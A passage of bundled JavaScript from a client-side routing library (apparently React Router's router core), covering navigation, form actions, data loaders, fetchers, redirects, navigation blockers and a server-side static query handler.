    if (!matches) {
      let error = getInternalRouterError(404, {
        pathname: location.pathname
      }), {
        matches: notFoundMatches,
        route
      } = getShortCircuitMatches(routesToUse);
      cancelActiveDeferreds(), completeNavigation(location, {
        matches: notFoundMatches,
        loaderData: {},
        errors: {
          [route.id]: error
        }
      });
      return;
    }
    if (state.initialized && !isRevalidationRequired && isHashChangeOnly(state.location, location) && !(opts && opts.submission && isMutationMethod(opts.submission.formMethod))) {
      completeNavigation(location, {
        matches
      });
      return;
    }
    pendingNavigationController = new AbortController();
    let request = createClientSideRequest(init.history, location, pendingNavigationController.signal, opts && opts.submission), pendingActionData, pendingError;
    if (opts && opts.pendingError)
      pendingError = {
        [findNearestBoundary(matches).route.id]: opts.pendingError
      };
    else if (opts && opts.submission && isMutationMethod(opts.submission.formMethod)) {
      let actionOutput = await handleAction(request, location, opts.submission, matches, {
        replace: opts.replace
      });
      if (actionOutput.shortCircuited)
        return;
      pendingActionData = actionOutput.pendingActionData, pendingError = actionOutput.pendingActionError, loadingNavigation = getLoadingNavigation(location, opts.submission), request = new Request(request.url, {
        signal: request.signal
      });
    }
    let {
      shortCircuited,
      loaderData,
      errors
    } = await handleLoaders(request, location, matches, loadingNavigation, opts && opts.submission, opts && opts.fetcherSubmission, opts && opts.replace, pendingActionData, pendingError);
    shortCircuited || (pendingNavigationController = null, completeNavigation(location, _extends({
      matches
    }, pendingActionData ? {
      actionData: pendingActionData
    } : {}, {
      loaderData,
      errors
    })));
  }
  async function handleAction(request, location, submission, matches, opts) {
    opts === void 0 && (opts = {}), interruptActiveLoads();
    let navigation = getSubmittingNavigation(location, submission);
    updateState({
      navigation
    });
    let result, actionMatch = getTargetMatch(matches, location);
    if (!actionMatch.route.action && !actionMatch.route.lazy)
      result = {
        type: ResultType.error,
        error: getInternalRouterError(405, {
          method: request.method,
          pathname: location.pathname,
          routeId: actionMatch.route.id
        })
      };
    else if (result = await callLoaderOrAction("action", request, actionMatch, matches, manifest, mapRouteProperties2, basename), request.signal.aborted)
      return {
        shortCircuited: !0
      };
    if (isRedirectResult(result)) {
      let replace;
      return opts && opts.replace != null ? replace = opts.replace : replace = result.location === state.location.pathname + state.location.search, await startRedirectNavigation(state, result, {
        submission,
        replace
      }), {
        shortCircuited: !0
      };
    }
    if (isErrorResult(result)) {
      let boundaryMatch = findNearestBoundary(matches, actionMatch.route.id);
      return (opts && opts.replace) !== !0 && (pendingAction = Action.Push), {
        // Send back an empty object we can use to clear out any prior actionData
        pendingActionData: {},
        pendingActionError: {
          [boundaryMatch.route.id]: result.error
        }
      };
    }
    if (isDeferredResult(result))
      throw getInternalRouterError(400, {
        type: "defer-action"
      });
    return {
      pendingActionData: {
        [actionMatch.route.id]: result.data
      }
    };
  }
  async function handleLoaders(request, location, matches, overrideNavigation, submission, fetcherSubmission, replace, pendingActionData, pendingError) {
    let loadingNavigation = overrideNavigation || getLoadingNavigation(location, submission), activeSubmission = submission || fetcherSubmission || getSubmissionFromNavigation(loadingNavigation), routesToUse = inFlightDataRoutes || dataRoutes, [matchesToLoad, revalidatingFetchers] = getMatchesToLoad(init.history, state, matches, activeSubmission, location, isRevalidationRequired, cancelledDeferredRoutes, cancelledFetcherLoads, fetchLoadMatches, fetchRedirectIds, routesToUse, basename, pendingActionData, pendingError);
    if (cancelActiveDeferreds((routeId) => !(matches && matches.some((m) => m.route.id === routeId)) || matchesToLoad && matchesToLoad.some((m) => m.route.id === routeId)), pendingNavigationLoadId = ++incrementingLoadId, matchesToLoad.length === 0 && revalidatingFetchers.length === 0) {
      let updatedFetchers2 = markFetchRedirectsDone();
      return completeNavigation(location, _extends({
        matches,
        loaderData: {},
        // Commit pending error if we're short circuiting
        errors: pendingError || null
      }, pendingActionData ? {
        actionData: pendingActionData
      } : {}, updatedFetchers2 ? {
        fetchers: new Map(state.fetchers)
      } : {})), {
        shortCircuited: !0
      };
    }
    if (!isUninterruptedRevalidation) {
      revalidatingFetchers.forEach((rf) => {
        let fetcher = state.fetchers.get(rf.key), revalidatingFetcher = getLoadingFetcher(void 0, fetcher ? fetcher.data : void 0);
        state.fetchers.set(rf.key, revalidatingFetcher);
      });
      let actionData = pendingActionData || state.actionData;
      updateState(_extends({
        navigation: loadingNavigation
      }, actionData ? Object.keys(actionData).length === 0 ? {
        actionData: null
      } : {
        actionData
      } : {}, revalidatingFetchers.length > 0 ? {
        fetchers: new Map(state.fetchers)
      } : {}));
    }
    revalidatingFetchers.forEach((rf) => {
      fetchControllers.has(rf.key) && abortFetcher(rf.key), rf.controller && fetchControllers.set(rf.key, rf.controller);
    });
    let abortPendingFetchRevalidations = () => revalidatingFetchers.forEach((f) => abortFetcher(f.key));
    pendingNavigationController && pendingNavigationController.signal.addEventListener("abort", abortPendingFetchRevalidations);
    let {
      results,
      loaderResults,
      fetcherResults
    } = await callLoadersAndMaybeResolveData(state.matches, matches, matchesToLoad, revalidatingFetchers, request);
    if (request.signal.aborted)
      return {
        shortCircuited: !0
      };
    pendingNavigationController && pendingNavigationController.signal.removeEventListener("abort", abortPendingFetchRevalidations), revalidatingFetchers.forEach((rf) => fetchControllers.delete(rf.key));
    let redirect4 = findRedirect(results);
    if (redirect4) {
      if (redirect4.idx >= matchesToLoad.length) {
        let fetcherKey = revalidatingFetchers[redirect4.idx - matchesToLoad.length].key;
        fetchRedirectIds.add(fetcherKey);
      }
      return await startRedirectNavigation(state, redirect4.result, {
        replace
      }), {
        shortCircuited: !0
      };
    }
    let {
      loaderData,
      errors
    } = processLoaderData(state, matches, matchesToLoad, loaderResults, pendingError, revalidatingFetchers, fetcherResults, activeDeferreds);
    activeDeferreds.forEach((deferredData, routeId) => {
      deferredData.subscribe((aborted) => {
        (aborted || deferredData.done) && activeDeferreds.delete(routeId);
      });
    });
    let updatedFetchers = markFetchRedirectsDone(), didAbortFetchLoads = abortStaleFetchLoads(pendingNavigationLoadId), shouldUpdateFetchers = updatedFetchers || didAbortFetchLoads || revalidatingFetchers.length > 0;
    return _extends({
      loaderData,
      errors
    }, shouldUpdateFetchers ? {
      fetchers: new Map(state.fetchers)
    } : {});
  }
  function getFetcher(key) {
    return state.fetchers.get(key) || IDLE_FETCHER;
  }
  function fetch(key, routeId, href, opts) {
    if (isServer)
      throw new Error("router.fetch() was called during the server render, but it shouldn't be. You are likely calling a useFetcher() method in the body of your component. Try moving it to a useEffect or a callback.");
    fetchControllers.has(key) && abortFetcher(key);
    let routesToUse = inFlightDataRoutes || dataRoutes, normalizedPath = normalizeTo(state.location, state.matches, basename, future2.v7_prependBasename, href, routeId, opts == null ? void 0 : opts.relative), matches = matchRoutes(routesToUse, normalizedPath, basename);
    if (!matches) {
      setFetcherError(key, routeId, getInternalRouterError(404, {
        pathname: normalizedPath
      }));
      return;
    }
    let {
      path: path2,
      submission,
      error
    } = normalizeNavigateOptions(future2.v7_normalizeFormMethod, !0, normalizedPath, opts);
    if (error) {
      setFetcherError(key, routeId, error);
      return;
    }
    let match = getTargetMatch(matches, path2);
    if (pendingPreventScrollReset = (opts && opts.preventScrollReset) === !0, submission && isMutationMethod(submission.formMethod)) {
      handleFetcherAction(key, routeId, path2, match, matches, submission);
      return;
    }
    fetchLoadMatches.set(key, {
      routeId,
      path: path2
    }), handleFetcherLoader(key, routeId, path2, match, matches, submission);
  }
  async function handleFetcherAction(key, routeId, path2, match, requestMatches, submission) {
    if (interruptActiveLoads(), fetchLoadMatches.delete(key), !match.route.action && !match.route.lazy) {
      let error = getInternalRouterError(405, {
        method: submission.formMethod,
        pathname: path2,
        routeId
      });
      setFetcherError(key, routeId, error);
      return;
    }
    let existingFetcher = state.fetchers.get(key), fetcher = getSubmittingFetcher(submission, existingFetcher);
    state.fetchers.set(key, fetcher), updateState({
      fetchers: new Map(state.fetchers)
    });
    let abortController = new AbortController(), fetchRequest = createClientSideRequest(init.history, path2, abortController.signal, submission);
    fetchControllers.set(key, abortController);
    let originatingLoadId = incrementingLoadId, actionResult = await callLoaderOrAction("action", fetchRequest, match, requestMatches, manifest, mapRouteProperties2, basename);
    if (fetchRequest.signal.aborted) {
      fetchControllers.get(key) === abortController && fetchControllers.delete(key);
      return;
    }
    if (isRedirectResult(actionResult))
      if (fetchControllers.delete(key), pendingNavigationLoadId > originatingLoadId) {
        let doneFetcher = getDoneFetcher(void 0);
        state.fetchers.set(key, doneFetcher), updateState({
          fetchers: new Map(state.fetchers)
        });
        return;
      } else {
        fetchRedirectIds.add(key);
        let loadingFetcher = getLoadingFetcher(submission);
        return state.fetchers.set(key, loadingFetcher), updateState({
          fetchers: new Map(state.fetchers)
        }), startRedirectNavigation(state, actionResult, {
          submission,
          isFetchActionRedirect: !0
        });
      }
    if (isErrorResult(actionResult)) {
      setFetcherError(key, routeId, actionResult.error);
      return;
    }
    if (isDeferredResult(actionResult))
      throw getInternalRouterError(400, {
        type: "defer-action"
      });
    let nextLocation = state.navigation.location || state.location, revalidationRequest = createClientSideRequest(init.history, nextLocation, abortController.signal), routesToUse = inFlightDataRoutes || dataRoutes, matches = state.navigation.state !== "idle" ? matchRoutes(routesToUse, state.navigation.location, basename) : state.matches;
    invariant(matches, "Didn't find any matches after fetcher action");
    let loadId = ++incrementingLoadId;
    fetchReloadIds.set(key, loadId);
    let loadFetcher = getLoadingFetcher(submission, actionResult.data);
    state.fetchers.set(key, loadFetcher);
    let [matchesToLoad, revalidatingFetchers] = getMatchesToLoad(
      init.history,
      state,
      matches,
      submission,
      nextLocation,
      isRevalidationRequired,
      cancelledDeferredRoutes,
      cancelledFetcherLoads,
      fetchLoadMatches,
      fetchRedirectIds,
      routesToUse,
      basename,
      {
        [match.route.id]: actionResult.data
      },
      void 0
      // No need to send through errors since we short circuit above
    );
    revalidatingFetchers.filter((rf) => rf.key !== key).forEach((rf) => {
      let staleKey = rf.key, existingFetcher2 = state.fetchers.get(staleKey), revalidatingFetcher = getLoadingFetcher(void 0, existingFetcher2 ? existingFetcher2.data : void 0);
      state.fetchers.set(staleKey, revalidatingFetcher), fetchControllers.has(staleKey) && abortFetcher(staleKey), rf.controller && fetchControllers.set(staleKey, rf.controller);
    }), updateState({
      fetchers: new Map(state.fetchers)
    });
    let abortPendingFetchRevalidations = () => revalidatingFetchers.forEach((rf) => abortFetcher(rf.key));
    abortController.signal.addEventListener("abort", abortPendingFetchRevalidations);
    let {
      results,
      loaderResults,
      fetcherResults
    } = await callLoadersAndMaybeResolveData(state.matches, matches, matchesToLoad, revalidatingFetchers, revalidationRequest);
    if (abortController.signal.aborted)
      return;
    abortController.signal.removeEventListener("abort", abortPendingFetchRevalidations), fetchReloadIds.delete(key), fetchControllers.delete(key), revalidatingFetchers.forEach((r) => fetchControllers.delete(r.key));
    let redirect4 = findRedirect(results);
    if (redirect4) {
      if (redirect4.idx >= matchesToLoad.length) {
        let fetcherKey = revalidatingFetchers[redirect4.idx - matchesToLoad.length].key;
        fetchRedirectIds.add(fetcherKey);
      }
      return startRedirectNavigation(state, redirect4.result);
    }
    let {
      loaderData,
      errors
    } = processLoaderData(state, state.matches, matchesToLoad, loaderResults, void 0, revalidatingFetchers, fetcherResults, activeDeferreds);
    if (state.fetchers.has(key)) {
      let doneFetcher = getDoneFetcher(actionResult.data);
      state.fetchers.set(key, doneFetcher);
    }
    let didAbortFetchLoads = abortStaleFetchLoads(loadId);
    state.navigation.state === "loading" && loadId > pendingNavigationLoadId ? (invariant(pendingAction, "Expected pending action"), pendingNavigationController && pendingNavigationController.abort(), completeNavigation(state.navigation.location, {
      matches,
      loaderData,
      errors,
      fetchers: new Map(state.fetchers)
    })) : (updateState(_extends({
      errors,
      loaderData: mergeLoaderData(state.loaderData, loaderData, matches, errors)
    }, didAbortFetchLoads || revalidatingFetchers.length > 0 ? {
      fetchers: new Map(state.fetchers)
    } : {})), isRevalidationRequired = !1);
  }
  async function handleFetcherLoader(key, routeId, path2, match, matches, submission) {
    let existingFetcher = state.fetchers.get(key), loadingFetcher = getLoadingFetcher(submission, existingFetcher ? existingFetcher.data : void 0);
    state.fetchers.set(key, loadingFetcher), updateState({
      fetchers: new Map(state.fetchers)
    });
    let abortController = new AbortController(), fetchRequest = createClientSideRequest(init.history, path2, abortController.signal);
    fetchControllers.set(key, abortController);
    let originatingLoadId = incrementingLoadId, result = await callLoaderOrAction("loader", fetchRequest, match, matches, manifest, mapRouteProperties2, basename);
    if (isDeferredResult(result) && (result = await resolveDeferredData(result, fetchRequest.signal, !0) || result), fetchControllers.get(key) === abortController && fetchControllers.delete(key), fetchRequest.signal.aborted)
      return;
    if (isRedirectResult(result))
      if (pendingNavigationLoadId > originatingLoadId) {
        let doneFetcher2 = getDoneFetcher(void 0);
        state.fetchers.set(key, doneFetcher2), updateState({
          fetchers: new Map(state.fetchers)
        });
        return;
      } else {
        fetchRedirectIds.add(key), await startRedirectNavigation(state, result);
        return;
      }
    if (isErrorResult(result)) {
      let boundaryMatch = findNearestBoundary(state.matches, routeId);
      state.fetchers.delete(key), updateState({
        fetchers: new Map(state.fetchers),
        errors: {
          [boundaryMatch.route.id]: result.error
        }
      });
      return;
    }
    invariant(!isDeferredResult(result), "Unhandled fetcher deferred data");
    let doneFetcher = getDoneFetcher(result.data);
    state.fetchers.set(key, doneFetcher), updateState({
      fetchers: new Map(state.fetchers)
    });
  }
  async function startRedirectNavigation(state2, redirect4, _temp) {
    let {
      submission,
      replace,
      isFetchActionRedirect
    } = _temp === void 0 ? {} : _temp;
    redirect4.revalidate && (isRevalidationRequired = !0);
    let redirectLocation = createLocation(
      state2.location,
      redirect4.location,
      // TODO: This can be removed once we get rid of useTransition in Remix v2
      _extends({
        _isRedirect: !0
      }, isFetchActionRedirect ? {
        _isFetchActionRedirect: !0
      } : {})
    );
    if (invariant(redirectLocation, "Expected a location on the redirect navigation"), ABSOLUTE_URL_REGEX.test(redirect4.location) && isBrowser2) {
      let url = init.history.createURL(redirect4.location), isDifferentBasename = stripBasename(url.pathname, basename) == null;
      if (routerWindow.location.origin !== url.origin || isDifferentBasename) {
        replace ? routerWindow.location.replace(redirect4.location) : routerWindow.location.assign(redirect4.location);
        return;
      }
    }
    pendingNavigationController = null;
    let redirectHistoryAction = replace === !0 ? Action.Replace : Action.Push, activeSubmission = submission || getSubmissionFromNavigation(state2.navigation);
    if (redirectPreserveMethodStatusCodes.has(redirect4.status) && activeSubmission && isMutationMethod(activeSubmission.formMethod))
      await startNavigation(redirectHistoryAction, redirectLocation, {
        submission: _extends({}, activeSubmission, {
          formAction: redirect4.location
        }),
        // Preserve this flag across redirects
        preventScrollReset: pendingPreventScrollReset
      });
    else if (isFetchActionRedirect)
      await startNavigation(redirectHistoryAction, redirectLocation, {
        overrideNavigation: getLoadingNavigation(redirectLocation),
        fetcherSubmission: activeSubmission,
        // Preserve this flag across redirects
        preventScrollReset: pendingPreventScrollReset
      });
    else {
      let overrideNavigation = getLoadingNavigation(redirectLocation, activeSubmission);
      await startNavigation(redirectHistoryAction, redirectLocation, {
        overrideNavigation,
        // Preserve this flag across redirects
        preventScrollReset: pendingPreventScrollReset
      });
    }
  }
  async function callLoadersAndMaybeResolveData(currentMatches, matches, matchesToLoad, fetchersToLoad, request) {
    let results = await Promise.all([...matchesToLoad.map((match) => callLoaderOrAction("loader", request, match, matches, manifest, mapRouteProperties2, basename)), ...fetchersToLoad.map((f) => f.matches && f.match && f.controller ? callLoaderOrAction("loader", createClientSideRequest(init.history, f.path, f.controller.signal), f.match, f.matches, manifest, mapRouteProperties2, basename) : {
      type: ResultType.error,
      error: getInternalRouterError(404, {
        pathname: f.path
      })
    })]), loaderResults = results.slice(0, matchesToLoad.length), fetcherResults = results.slice(matchesToLoad.length);
    return await Promise.all([resolveDeferredResults(currentMatches, matchesToLoad, loaderResults, loaderResults.map(() => request.signal), !1, state.loaderData), resolveDeferredResults(currentMatches, fetchersToLoad.map((f) => f.match), fetcherResults, fetchersToLoad.map((f) => f.controller ? f.controller.signal : null), !0)]), {
      results,
      loaderResults,
      fetcherResults
    };
  }
  function interruptActiveLoads() {
    isRevalidationRequired = !0, cancelledDeferredRoutes.push(...cancelActiveDeferreds()), fetchLoadMatches.forEach((_, key) => {
      fetchControllers.has(key) && (cancelledFetcherLoads.push(key), abortFetcher(key));
    });
  }
  function setFetcherError(key, routeId, error) {
    let boundaryMatch = findNearestBoundary(state.matches, routeId);
    deleteFetcher(key), updateState({
      errors: {
        [boundaryMatch.route.id]: error
      },
      fetchers: new Map(state.fetchers)
    });
  }
  function deleteFetcher(key) {
    let fetcher = state.fetchers.get(key);
    fetchControllers.has(key) && !(fetcher && fetcher.state === "loading" && fetchReloadIds.has(key)) && abortFetcher(key), fetchLoadMatches.delete(key), fetchReloadIds.delete(key), fetchRedirectIds.delete(key), state.fetchers.delete(key);
  }
  function abortFetcher(key) {
    let controller = fetchControllers.get(key);
    invariant(controller, "Expected fetch controller: " + key), controller.abort(), fetchControllers.delete(key);
  }
  function markFetchersDone(keys) {
    for (let key of keys) {
      let fetcher = getFetcher(key), doneFetcher = getDoneFetcher(fetcher.data);
      state.fetchers.set(key, doneFetcher);
    }
  }
  function markFetchRedirectsDone() {
    let doneKeys = [], updatedFetchers = !1;
    for (let key of fetchRedirectIds) {
      let fetcher = state.fetchers.get(key);
      invariant(fetcher, "Expected fetcher: " + key), fetcher.state === "loading" && (fetchRedirectIds.delete(key), doneKeys.push(key), updatedFetchers = !0);
    }
    return markFetchersDone(doneKeys), updatedFetchers;
  }
  function abortStaleFetchLoads(landedId) {
    let yeetedKeys = [];
    for (let [key, id] of fetchReloadIds)
      if (id < landedId) {
        let fetcher = state.fetchers.get(key);
        invariant(fetcher, "Expected fetcher: " + key), fetcher.state === "loading" && (abortFetcher(key), fetchReloadIds.delete(key), yeetedKeys.push(key));
      }
    return markFetchersDone(yeetedKeys), yeetedKeys.length > 0;
  }
  function getBlocker(key, fn) {
    let blocker = state.blockers.get(key) || IDLE_BLOCKER;
    return blockerFunctions.get(key) !== fn && blockerFunctions.set(key, fn), blocker;
  }
  function deleteBlocker(key) {
    state.blockers.delete(key), blockerFunctions.delete(key);
  }
  function updateBlocker(key, newBlocker) {
    let blocker = state.blockers.get(key) || IDLE_BLOCKER;
    invariant(blocker.state === "unblocked" && newBlocker.state === "blocked" || blocker.state === "blocked" && newBlocker.state === "blocked" || blocker.state === "blocked" && newBlocker.state === "proceeding" || blocker.state === "blocked" && newBlocker.state === "unblocked" || blocker.state === "proceeding" && newBlocker.state === "unblocked", "Invalid blocker state transition: " + blocker.state + " -> " + newBlocker.state);
    let blockers = new Map(state.blockers);
    blockers.set(key, newBlocker), updateState({
      blockers
    });
  }
  function shouldBlockNavigation(_ref2) {
    let {
      currentLocation,
      nextLocation,
      historyAction
    } = _ref2;
    if (blockerFunctions.size === 0)
      return;
    blockerFunctions.size > 1 && warning(!1, "A router only supports one blocker at a time");
    let entries = Array.from(blockerFunctions.entries()), [blockerKey, blockerFunction] = entries[entries.length - 1], blocker = state.blockers.get(blockerKey);
    if (!(blocker && blocker.state === "proceeding") && blockerFunction({
      currentLocation,
      nextLocation,
      historyAction
    }))
      return blockerKey;
  }
  function cancelActiveDeferreds(predicate) {
    let cancelledRouteIds = [];
    return activeDeferreds.forEach((dfd, routeId) => {
      (!predicate || predicate(routeId)) && (dfd.cancel(), cancelledRouteIds.push(routeId), activeDeferreds.delete(routeId));
    }), cancelledRouteIds;
  }
  function enableScrollRestoration(positions, getPosition, getKey) {
    if (savedScrollPositions2 = positions, getScrollPosition = getPosition, getScrollRestorationKey = getKey || null, !initialScrollRestored && state.navigation === IDLE_NAVIGATION) {
      initialScrollRestored = !0;
      let y = getSavedScrollPosition(state.location, state.matches);
      y != null && updateState({
        restoreScrollPosition: y
      });
    }
    return () => {
      savedScrollPositions2 = null, getScrollPosition = null, getScrollRestorationKey = null;
    };
  }
  function getScrollKey(location, matches) {
    return getScrollRestorationKey && getScrollRestorationKey(location, matches.map((m) => createUseMatchesMatch(m, state.loaderData))) || location.key;
  }
  function saveScrollPosition(location, matches) {
    if (savedScrollPositions2 && getScrollPosition) {
      let key = getScrollKey(location, matches);
      savedScrollPositions2[key] = getScrollPosition();
    }
  }
  function getSavedScrollPosition(location, matches) {
    if (savedScrollPositions2) {
      let key = getScrollKey(location, matches), y = savedScrollPositions2[key];
      if (typeof y == "number")
        return y;
    }
    return null;
  }
  function _internalSetRoutes(newRoutes) {
    manifest = {}, inFlightDataRoutes = convertRoutesToDataRoutes(newRoutes, mapRouteProperties2, void 0, manifest);
  }
  return router = {
    get basename() {
      return basename;
    },
    get state() {
      return state;
    },
    get routes() {
      return dataRoutes;
    },
    initialize,
    subscribe,
    enableScrollRestoration,
    navigate,
    fetch,
    revalidate,
    // Passthrough to history-aware createHref used by useHref so we get proper
    // hash-aware URLs in DOM paths
    createHref: (to) => init.history.createHref(to),
    encodeLocation: (to) => init.history.encodeLocation(to),
    getFetcher,
    deleteFetcher,
    dispose,
    getBlocker,
    deleteBlocker,
    _internalFetchControllers: fetchControllers,
    _internalActiveDeferreds: activeDeferreds,
    // TODO: Remove setRoutes, it's temporary to avoid dealing with
    // updating the tree while validating the update algorithm.
    _internalSetRoutes
  }, router;
}
function createStaticHandler(routes2, opts) {
  invariant(routes2.length > 0, "You must provide a non-empty routes array to createStaticHandler");
  let manifest = {}, basename = (opts ? opts.basename : null) || "/", mapRouteProperties2;
  if (opts != null && opts.mapRouteProperties)
    mapRouteProperties2 = opts.mapRouteProperties;
  else if (opts != null && opts.detectErrorBoundary) {
    let detectErrorBoundary = opts.detectErrorBoundary;
    mapRouteProperties2 = (route) => ({
      hasErrorBoundary: detectErrorBoundary(route)
    });
  } else
    mapRouteProperties2 = defaultMapRouteProperties;
  let dataRoutes = convertRoutesToDataRoutes(routes2, mapRouteProperties2, void 0, manifest);
  async function query(request, _temp2) {
    let {
      requestContext
    } = _temp2 === void 0 ? {} : _temp2, url = new URL(request.url), method = request.method, location = createLocation("", createPath(url), null, "default"), matches = matchRoutes(dataRoutes, location, basename);
    if (!isValidMethod(method) && method !== "HEAD") {
      let error = getInternalRouterError(405, {
        method
      }), {
        matches: methodNotAllowedMatches,
        route
      } = getShortCircuitMatches(dataRoutes);
      return {
        basename,
        location,
        matches: methodNotAllowedMatches,
        loaderData: {},
        actionData: null,
        errors: {
          [route.id]: error
        },
        statusCode: error.status,
        loaderHeaders: {},
        actionHeaders: {},
        activeDeferreds: null
      };
    } else if (!matches) {
      let error = getInternalRouterError(404, {
        pathname: location.pathname
      }), {
        matches: notFoundMatches,
        route
      } = getShortCircuitMatches(dataRoutes);
      return {
        basename,
        location,
        matches: notFoundMatches,
        loaderData: {},
        actionData: null,
        errors: {
          [route.id]: error
        },
        statusCode: error.status,
        loaderHeaders: {},
        actionHeaders: {},
        activeDeferreds: null
      };
    }
    let result = await queryImpl(request, location, matches, requestContext);
    return isResponse(result) ? result : _extends({
      location,
      basename
    }, result);
  }
  async function queryRoute(request, _temp3) {
    let {
      routeId,
      requestContext
    } = _temp3 === void 0 ? {} : _temp3, url = new URL(request.url), method = request.method, location = createLocation("", createPath(url), null, "default"), matches = matchRoutes(dataRoutes, location, basename);
    if (!isValidMethod(method) && method !== "HEAD" && method !== "OPTIONS")
      throw getInternalRouterError(405, {
        method
      });
    if (!matches)
      throw getInternalRouterError(404, {
        pathname: location.pathname
      });
    let match = routeId ? matches.find((m) => m.route.id === routeId) : getTargetMatch(matches, location);
    if (routeId && !match)
      throw getInternalRouterError(403, {
        pathname: location.pathname,
        routeId
      });
    if (!match)
      throw getInternalRouterError(404, {
        pathname: location.pathname
      });
    let result = await queryImpl(request, location, matches, requestContext, match);
    if (isResponse(result))
      return result;
    let error = result.errors ? Object.values(result.errors)[0] : void 0;
    if (error !== void 0)
      throw error;
    if (result.actionData)
      return Object.values(result.actionData)[0];
    if (result.loaderData) {
      var _result$activeDeferre;
      let data = Object.values(result.loaderData)[0];
      return (_result$activeDeferre = result.activeDeferreds) != null && _result$activeDeferre[match.route.id] && (data[UNSAFE_DEFERRED_SYMBOL] = result.activeDeferreds[match.route.id]), data;
    }
  }
  async function queryImpl(request, location, matches, requestContext, routeMatch) {
    invariant(request.signal, "query()/queryRoute() requests must contain an AbortController signal");
    try {
      if (isMutationMethod(request.method.toLowerCase()))
        return await submit(request, matches, routeMatch || getTargetMatch(matches, location), requestContext, routeMatch != null);
      let result = await loadRouteData(request, matches, requestContext, routeMatch);
      return isResponse(result) ? result : _extends({}, result, {
        actionData: null,
        actionHeaders: {}
      });
    } catch (e) {
      if (isQueryRouteResponse(e)) {
        if (e.type === ResultType.error && !isRedirectResponse(e.response))
          throw e.response;
        return e.response;
      }
      if (isRedirectResponse(e))
        return e;
      throw e;
    }
  }
  async function submit(request, matches, actionMatch, requestContext, isRouteRequest) {
    let result;
    if (!actionMatch.route.action && !actionMatch.route.lazy) {
      let error = getInternalRouterError(405, {
        method: request.method,
        pathname: new URL(request.url).pathname,
        routeId: actionMatch.route.id
      });
      if (isRouteRequest)
        throw error;
      result = {
        type: ResultType.error,
        error
      };
    } else if (result = await callLoaderOrAction("action", request, actionMatch, matches, manifest, mapRouteProperties2, basename, {
      isStaticRequest: !0,
      isRouteRequest,
      requestContext
    }), request.signal.aborted) {
      let method = isRouteRequest ? "queryRoute" : "query";
      throw new Error(method + "() call aborted");
    }
    if (isRedirectResult(result))
      throw new Response(null, {
        status: result.status,
        headers: {
          Location: result.location
        }
      });
    if (isDeferredResult(result)) {
      let error = getInternalRouterError(400, {
        type: "defer-action"
      });
      if (isRouteRequest)
        throw error;
      result = {
        type: ResultType.error,
        error
      };
    }
    if (isRouteRequest) {
      if (isErrorResult(result))
        throw result.error;
      return {
        matches: [actionMatch],
        loaderData: {},
        actionData: {
          [actionMatch.route.id]: result.data
        },
        errors: null,
        // Note: statusCode + headers are unused here since queryRoute will
        // return the raw Response or value
        statusCode: 200,
        loaderHeaders: {},
        actionHeaders: {},
        activeDeferreds: null
      };
    }
    if (isErrorResult(result)) {
      let boundaryMatch = findNearestBoundary(matches, actionMatch.route.id), context2 = await loadRouteData(request, matches, requestContext, void 0, {
        [boundaryMatch.route.id]: result.error
      });
      return _extends({}, context2, {
        statusCode: isRouteErrorResponse(result.error) ? result.error.status : 500,
        actionData: null,
        actionHeaders: _extends({}, result.headers ? {
          [actionMatch.route.id]: result.headers
        } : {})
      });
    }
    let loaderRequest = new Request(request.url, {
      headers: request.headers,
      redirect: request.redirect,
      signal: request.signal
    }), context = await loadRouteData(loaderRequest, matches, requestContext);
    return _extends({}, context, result.statusCode ? {
      statusCode: result.statusCode
    } : {}, {
      actionData: {
        [actionMatch.route.id]: result.data
      },
      actionHeaders: _extends({}, result.headers ? {
        [actionMatch.route.id]: result.headers
      } : {})
    });
  }
  async function loadRouteData(request, matches, requestContext, routeMatch, pendingActionError) {
    let isRouteRequest = routeMatch != null;
    if (isRouteRequest && !(routeMatch != null && routeMatch.route.loader) && !(routeMatch != null && routeMatch.route.lazy))
      throw getInternalRouterError(400, {
        method: request.method,
        pathname: new URL(request.url).pathname,
        routeId: routeMatch == null ? void 0 : routeMatch.route.id
      });
    let matchesToLoad = (routeMatch ? [routeMatch] : getLoaderMatchesUntilBoundary(matches, Object.keys(pendingActionError || {})[0])).filter((m) => m.route.loader || m.route.lazy);
    if (matchesToLoad.length === 0)
      return {
        matches,
        // Add a null for all matched routes for proper revalidation on the client
        loaderData: matches.reduce((acc, m) => Object.assign(acc, {
          [m.route.id]: null
        }), {}),
        errors: pendingActionError || null,
        statusCode: 200,
        loaderHeaders: {},
        activeDeferreds: null
      };
    let results = await Promise.all([...matchesToLoad.map((match) => callLoaderOrAction("loader", request, match, matches, manifest, mapRouteProperties2, basename, {
      isStaticRequest: !0,
      isRouteRequest,
      requestContext
    }))]);
    if (request.signal.aborted) {
      let method = isRouteRequest ? "queryRoute" : "query";
      throw new Error(method + "() call aborted");
    }
    let activeDeferreds = /* @__PURE__ */ new Map(), context = processRouteLoaderData(matches, matchesToLoad, results, pendingActionError, activeDeferreds), executedLoaders = new Set(matchesToLoad.map((match) => match.route.id));
    return matches.forEach((match) => {
      executedLoaders.has(match.route.id) || (context.loaderData[match.route.id] = null);
    }), _extends({}, context, {
      matches,
      activeDeferreds: activeDeferreds.size > 0 ? Object.fromEntries(activeDeferreds.entries()) : null
    });
  }
  return {
    dataRoutes,
    query,
    queryRoute
  };
}
function getStaticContextFromError(routes2, context, error) {
  return _extends({}, context, {
    statusCode: 500,
    errors: {
      [context._deepestRenderedBoundaryId || routes2[0].id]: error
    }
  });
}
function isSubmissionNavigation(opts) {
  return opts != null && ("formData" in opts && opts.formData != null || "body" in opts && opts.body !== void 0);
}
function normalizeTo(location, matches, basename, prependBasename, to, fromRouteId, relative) {
  let contextualMatches, activeRouteMatch;
  if (fromRouteId != null && relative !== "path") {
    contextualMatches = [];
    for (let match of matches)
      if (contextualMatches.push(match), match.route.id === fromRouteId) {
        activeRouteMatch = match;
        break;
      }
  } else
    contextualMatches = matches, activeRouteMatch = matches[matches.length - 1];
  let path2 = resolveTo(to || ".", getPathContributingMatches(contextualMatches).map((m) => m.pathnameBase), stripBasename(location.pathname, basename) || location.pathname, relative === "path");
  return to == null && (path2.search = location.search, path2.hash = location.hash), (to == null || to === "" || to === ".") && activeRouteMatch && activeRouteMatch.route.index && !hasNakedIndexQuery(path2.search) && (path2.search = path2.search ? path2.search.replace(/^\?/, "?index&") : "?index"), prependBasename && basename !== "/" && (path2.pathname = path2.pathname === "/" ? basename : joinPaths([basename, path2.pathname])), createPath(path2);
}
function normalizeNavigateOptions(normalizeFormMethod, isFetcher, path2, opts) {
  if (!opts || !isSubmissionNavigation(opts))
    return {
      path: path2
    };
  if (opts.formMethod && !isValidMethod(opts.formMethod))
    return {
      path: path2,
